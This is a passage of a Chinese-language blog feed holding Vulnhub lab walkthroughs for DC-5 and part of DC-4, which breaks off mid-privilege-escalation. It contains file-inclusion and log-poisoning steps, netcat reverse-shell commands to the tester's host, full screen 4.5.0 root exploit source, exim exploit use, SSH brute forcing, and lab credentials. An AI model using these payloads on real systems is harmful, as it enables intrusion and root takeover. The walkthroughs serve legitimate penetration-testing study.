    <link href="http://example.com/2023/06/05/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2023/06/05/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/</id>
    <published>2023-06-05T05:34:18.000Z</published>
    <updated>2023-06-06T15:41:23.170Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、前期准备"><a href="#一、前期准备" class="headerlink" title="一、前期准备"></a>一、前期准备</h3><h4 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1.下载地址"></a>1.下载地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-5,314/</span><br></pre></td></tr></table></figure><h4 id="2-利用工具"><a href="#2-利用工具" class="headerlink" title="2.利用工具"></a>2.利用工具</h4><p><strong>注意：</strong>网络设置需要修改哦</p><p>kali  桥接模式</p><p>DC-5 桥接模式</p><span id="more"></span><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230605134110517.png" alt="image-20230605134110517"></p><h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><h4 id="1-获取ip"><a href="#1-获取ip" class="headerlink" title="1.获取ip"></a>1.获取ip</h4><p>在 kali 中输入 <code>ifconfig</code> 产看当前IP地址。</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606083654295.png" alt="image-20230606083654295"></p><h4 id="2-探测存活主机"><a href="#2-探测存活主机" class="headerlink" title="2.探测存活主机"></a>2.探测存活主机</h4><p>扫描C段地址，查询同一网段中存活主机</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606084959856.png" alt="image-20230606084959856"></p><h4 id="3-收集网站信息"><a href="#3-收集网站信息" class="headerlink" title="3.收集网站信息"></a>3.收集网站信息</h4><p>查询到 <code>192.168.133.134</code> 网址中开放了80和111端口，访问一下</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606085244618.png" alt="image-20230606085244618"></p><p>发现一个网站，利用扩展了解一下这个网站利用的相关技术等基本信息</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606085346600.png" alt="image-20230606085346600"></p><p>在 <code>contact.php</code> 中发现点击提交按钮，会跳到 <code>thankyou.php</code> 中，每提交一次，会发现 <code>thankyou.php</code> 中底部时间会产生变化。</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606090508317.png" alt="image-20230606090508317"></p><p>没有什么关键信息，我们使用 <code>dirsearch</code> 扫描一下 </p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606090323151.png" alt="image-20230606090323151"></p><h4 id="4-发现漏洞"><a href="#4-发现漏洞" class="headerlink" title="4.发现漏洞"></a>4.发现漏洞</h4><p>发现了几个关键页面，分别访问了一下</p><p>thankyou.php和footer.php访问后发现了问题，对thankyou.php和footer.php的每一次请求copyright后面跟的年份都会改变，并且footer.php显示的内容是thankyou.php底部显示的内容，于是想到可能有文件包含漏洞。</p><blockquote><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p></blockquote><p> footer.php</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606094252367.png" alt="image-20230606094252367"></p><p>thankyou.php</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606094515982.png" alt="image-20230606094515982"></p><h3 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h3><h4 id="1-爆破参数名"><a href="#1-爆破参数名" class="headerlink" title="1.爆破参数名"></a>1.爆破参数名</h4><p>尝试利用wfuzz爆破参数名</p><blockquote><p>这个可以解决报错</p><p>apt –purge remove python3-pycurl &amp;&amp; apt install libcurl4-openssl-dev libssl-dev</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt http://192.168.133.134 /thankyou.php?FUZZ=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606111732652.png" alt="image-20230606111732652"></p><h4 id="2-测试漏洞"><a href="#2-测试漏洞" class="headerlink" title="2.测试漏洞"></a>2.测试漏洞</h4><p>参数名拿到后，我们可以尝试测试文件包含漏洞</p><p>输入如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.133.134/thankyou.php?file=/etc/passwd</span><br></pre></td></tr></table></figure><p>执行成功返回</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606113150568.png" alt="image-20230606113150568"></p><p>这样可能看着太乱，点击产看源码</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606113340822.png" alt="image-20230606113340822"></p><p>发现<code>dc</code>用户</p><p>既然可以读取密码文件，那也可以读取日志文件，方便我们读取木马文件</p><p>系统默认路径：<code>/var/log/nginx/access.log</code></p><p>查看日志</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606113708509.png" alt="image-20230606113708509"></p><h4 id="3-写入一句话木马"><a href="#3-写入一句话木马" class="headerlink" title="3.写入一句话木马"></a>3.写入一句话木马</h4><p>根据Nginx服务的特征，我们在网站上的所有操作都将会被写入日志文件log内</p><p>由此我们可以通过这个日志文件来拿 shell</p><p>这里我们先写入一句话木马进行探测，看一下是否可以包含成功</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606131200419.png" alt="image-20230606131200419"></p><p>发送之后，访问url:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.133.134/thankyou.php?file=/var/log/nginx/error.log</span><br></pre></td></tr></table></figure><p>就会发现我们写进去的一句话木马</p><p><strong>注意：需要burp抓包写进去一句话木马，浏览器上直接写，会被解析成url编码</strong></p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606131556105.png" alt="image-20230606131556105"></p><h4 id="4-连接木马"><a href="#4-连接木马" class="headerlink" title="4.连接木马"></a>4.连接木马</h4><p>用蚁剑进行连接</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606131702114.png" alt="image-20230606131702114"></p><h4 id="5-反弹shell"><a href="#5-反弹shell" class="headerlink" title="5.反弹shell"></a>5.反弹shell</h4><p>在kali上监听5555端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606132412252.png" alt="image-20230606132412252"></p><p>进入蚁剑终端，执行反弹shell操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.133.230 5555 -e /bin/sh</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606132905890.png" alt="image-20230606132905890"></p><p>kali接收shell后，可以为所欲为了</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606132952964.png" alt="image-20230606132952964"></p><p>为了以后输入方便，我们可以使用交互式shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606133801163.png" alt="image-20230606133801163"></p><h4 id="6-提权"><a href="#6-提权" class="headerlink" title="6.提权"></a>6.提权</h4><p>尝试提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606134204309.png" alt="image-20230606134204309"></p><p>发现一个screen-4.5.0，可以去kali的漏洞库查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606134702837.png" alt="image-20230606134702837"></p><p>看到存在漏洞，我们去查看一下漏洞的具体利用方法<br><strong>注意：这里漏洞后侧显示的路径的根路径在&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits</strong><br>先把指定文件复制到桌面上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh</span><br></pre></td></tr></table></figure><p>在桌面上用vim打开文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim 41154.sh</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606210009795.png" alt="image-20230606210009795"></p><p>将这个文件分为三个部分保存</p><p>第一段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim libhax.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim rootshell.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim dc5.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell    </span><br></pre></td></tr></table></figure><p><strong>注意：第三段 <code>dc5.sh </code> 保存前需输入<code>:set ff=unix</code></strong></p><p>开启监听端口，通过靶场shell进行连接，提取文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 5566</span><br></pre></td></tr></table></figure><p>靶机连接提取文件</p><blockquote><p>这个需要提前进入靶机的 <code>tmp</code> 文件夹下，因为 <code>tmp</code> 文件夹的权限高</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget 192.168.133.230:5566/libhax.c</span><br><span class="line">wget 192.168.133.230:5566/rootshell.c</span><br><span class="line">wget 192.168.133.230:5566/dc5.sh</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606141912462.png" alt="image-20230606141912462"></p><p>三个文件都传输完成后，需要将除 <code>dc5.sh</code> 文件的其他文件都需要编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>编译完成后，需要将 <code>dc5.sh</code> 文件赋予执行文件的权限 </p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606142044853.png" alt="image-20230606142044853"></p><p>最后执行 <code>dc5.sh</code></p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606142132339.png" alt="image-20230606142132339"></p><p>得到命令行，输入 <code>whoami</code> 会发现是root权限</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC5%E9%9D%B6%E5%9C%BA/image-20230606142258872.png" alt="image-20230606142258872"></p><h3 id="四、知识点总结"><a href="#四、知识点总结" class="headerlink" title="四、知识点总结"></a>四、知识点总结</h3><blockquote><p>如何判断文件包含 thankyou.php文件包含footer.php<br>如何验证文件包含 file &#x3D;&#x2F;etc&#x2F;passwd<br>如何去利用文件包含 :<br>去找到文件源码，从源码中找信息<br>但由于是nginx1.6.2，有一个error.log，因此可以利用一句话木马<br>提权：screnn4.5.0<br>如何去利用，searchsploit去寻找这个漏洞相关信息<br>帮助文档能看懂<br>如何去下载文件<br>开一个端口，让其它主机去访问这个端口从而下载文件</p></blockquote><p>本文参考链接：<a href="https://blog.csdn.net/xhx836161547/article/details/128313056">https://blog.csdn.net/xhx836161547/article/details/128313056</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;一、前期准备&quot;&gt;&lt;a href=&quot;#一、前期准备&quot; class=&quot;headerlink&quot; title=&quot;一、前期准备&quot;&gt;&lt;/a&gt;一、前期准备&lt;/h3&gt;&lt;h4 id=&quot;1-下载地址&quot;&gt;&lt;a href=&quot;#1-下载地址&quot; class=&quot;headerlink&quot; title=&quot;1.下载地址&quot;&gt;&lt;/a&gt;1.下载地址&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://www.vulnhub.com/entry/dc-5,314/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h4 id=&quot;2-利用工具&quot;&gt;&lt;a href=&quot;#2-利用工具&quot; class=&quot;headerlink&quot; title=&quot;2.利用工具&quot;&gt;&lt;/a&gt;2.利用工具&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;网络设置需要修改哦&lt;/p&gt;
&lt;p&gt;kali  桥接模式&lt;/p&gt;
&lt;p&gt;DC-5 桥接模式&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-DC4靶场</title>
    <link href="http://example.com/2023/06/05/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2023/06/05/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/</id>
    <published>2023-06-05T05:34:09.000Z</published>
    <updated>2023-06-13T08:51:07.864Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、前期准备"><a href="#一、前期准备" class="headerlink" title="一、前期准备"></a>一、前期准备</h3><h4 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1.下载地址"></a>1.下载地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-4,313/</span><br></pre></td></tr></table></figure><h4 id="2-利用工具"><a href="#2-利用工具" class="headerlink" title="2.利用工具"></a>2.利用工具</h4><p><strong>注意：</strong>网络设置需要修改哦</p><p>kali  桥接模式</p><p>DC-4 桥接模式</p><span id="more"></span><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230605134110517.png" alt="image-20230605134110517"></p><h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><h4 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h4><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230605142153347.png" alt="image-20230605142153347"></p><p>发现靶机目标IP为192.168.1.9</p><blockquote><p>kali192.168.1.49</p><p>dc-4192.168.1.9</p></blockquote><h4 id="2-nmap扫描"><a href="#2-nmap扫描" class="headerlink" title="2.nmap扫描"></a>2.nmap扫描</h4><p>nmap扫描同一网段下主机及其开放端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1/24</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609090634584.png" alt="image-20230609090634584"></p><p>nmap扫描指定靶机IP开放端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 1-65535 192.168.1.9</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609094348637.png" alt="image-20230609094348637"></p><p>发现开放了两个端口，80和22端口</p><h4 id="3-收集网站信息"><a href="#3-收集网站信息" class="headerlink" title="3.收集网站信息"></a>3.收集网站信息</h4><p>发现一个登录页面</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609094823307.png" alt="image-20230609094823307"></p><p>根据网页信息，有admin用户</p><h3 id="三、web渗透"><a href="#三、web渗透" class="headerlink" title="三、web渗透"></a>三、web渗透</h3><h4 id="1-爆破登录密码"><a href="#1-爆破登录密码" class="headerlink" title="1.爆破登录密码"></a>1.爆破登录密码</h4><p>我们利用burp抓包爆破一下密码，字典上网上搜索一个，我的是十万多个的密码字典，地址就不写了，在github中可以找到的。</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609100856139.png" alt="image-20230609100856139"></p><p>密码是happy</p><p>拿到密码尝试登录</p><h4 id="2-测试漏洞"><a href="#2-测试漏洞" class="headerlink" title="2.测试漏洞"></a>2.测试漏洞</h4><p>登陆后</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609101102700.png" alt="image-20230609101102700"></p><p>点击命令，出现如下图</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609101146677.png" alt="image-20230609101146677"></p><p>好像是在执行系统命令，所以直接抓包改改数据</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609101913955.png" alt="image-20230609101913955"></p><p>确认是执行linux系统命令，尝试反弹shell。</p><h4 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h4><p>在kali中设置监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12445</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609102510493.png" alt="image-20230609102510493"></p><p>在burp中反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc+-e+/bin/bash+192.168.1.49+12445</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609102345123.png" alt="image-20230609102345123"></p><p>连接成功后为了方便，我们可以进入交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609103024096.png" alt="image-20230609103024096"></p><h3 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h3><h4 id="1-提权方法一"><a href="#1-提权方法一" class="headerlink" title="1.提权方法一"></a>1.提权方法一</h4><h5 id="找提权方法"><a href="#找提权方法" class="headerlink" title="找提权方法"></a>找提权方法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609104124383.png" alt="image-20230609104124383"></p><p>发现一个exim4</p><blockquote><p>Exim是基于GPL协议的开放源代码软件，由英国剑桥大学的Philip Hazel开发，目前最新版4.24。Exim是一个MTA（Message Transfer Agent），即消息传输代理，负责邮件的路由、转发和投递。Exim被作者设计成可运行于绝大多数的类Unix系统上，包括 Solaris，AIX，Linux等。<br>　 　Exim与其它开源的MTA（QMail、Postfix）相比，最大的特点是配置极其灵活。Exim的配置文件也是一个文本文件，但它支持一种称为 String Expansion的技术。String Expansion可以理解为一种简单的脚本语言，能够执行诸如条件判断、字符串转换等功能。当然，Exim基本的功能也是非常丰富的。</p></blockquote><p>查看一下exim4版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim4 --version</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609104654503.png" alt="image-20230609104654503"></p><p>exim4版本为4.87</p><h5 id="搜素本地漏洞库"><a href="#搜素本地漏洞库" class="headerlink" title="搜素本地漏洞库"></a>搜素本地漏洞库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim 4</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609105944950.png" alt="image-20230609105944950"></p><p>将46996.sh移动到桌面</p><h5 id="开启文件传输"><a href="#开启文件传输" class="headerlink" title="开启文件传输"></a>开启文件传输</h5><p>在桌面开启一个传输服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 5566</span><br></pre></td></tr></table></figure><p>在dc4靶机中获取这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.49:5566/46996.sh</span><br></pre></td></tr></table></figure><p>下载成功，给执行权限，并且运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br></pre></td></tr></table></figure><p>最终拿到root权限</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609113142110.png" alt="image-20230609113142110"></p><p>但这个貌似不是本题的正解，算是非预期解吧</p><h4 id="2-提权方法二"><a href="#2-提权方法二" class="headerlink" title="2.提权方法二"></a>2.提权方法二</h4><p>在靶机中翻看有什么文件</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609132357563.png" alt="image-20230609132357563"></p><p>在backups目录下发现一个类似密码字典的文件，应该是让我们爆破jim</p><h5 id="hydra爆破密码"><a href="#hydra爆破密码" class="headerlink" title="hydra爆破密码"></a>hydra爆破密码</h5><p>把文件内容复制，保存到kali里，保存名称为 <code>pass.txt</code> ，爆破使用hydra</p><blockquote><p>Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具。Hydra是一个验证性质的工具，主要目的是：<strong>展示安全研究人员从远程获取一个系统认证权限。</strong></p><p>在kali中内置</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P pass.txt 192.168.1.9 ssh</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609133628896.png" alt="image-20230609133628896"></p><p>得到账号密码</p><blockquote><p>账号：jim</p><p>密码：jibril04</p></blockquote><h5 id="ssh连接登录"><a href="#ssh连接登录" class="headerlink" title="ssh连接登录"></a>ssh连接登录</h5><p>使用kali进行ssh连接登录，输入两个yes，输入密码即可登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh @192.168.1.9</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609133854300.png" alt="image-20230609133854300"></p><p>接下来开始搜索文件</p><p>发现jim有一封邮件</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609134101066.png" alt="image-20230609134101066"></p><p>进入邮件目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd var/spool/mail</span><br></pre></td></tr></table></figure><p>进入后发现jim的邮件</p><p>打开之后</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609134330800.png" alt="image-20230609134330800"></p><p>可以看到发件人的账号和密码</p><blockquote><p>账号：charles</p><p>密码：^xHhA&amp;hvim0y</p></blockquote><p>直接su xxx切换用户</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609134602360.png" alt="image-20230609134602360"></p><p>发现，账号都是小写的才可以</p><h5 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h5><p>查看使用sudo运行的命令</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609134715585.png" 